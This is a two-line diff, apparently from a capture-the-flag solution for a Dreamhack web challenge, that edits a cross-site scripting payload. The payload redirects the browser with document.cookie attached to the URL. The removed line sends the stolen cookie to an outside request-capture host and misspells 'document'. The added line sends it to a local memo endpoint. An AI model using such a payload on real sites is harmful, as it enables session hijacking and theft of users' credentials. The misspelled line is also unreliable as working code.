@@ -1,1 +1,1 @@
-location.href='https://igxihss.request.dreamhack.games?params='%2bdocumnet.cookie
+location.href='http://127.0.0.1:8000/memo?memo='%2bdocument.cookie
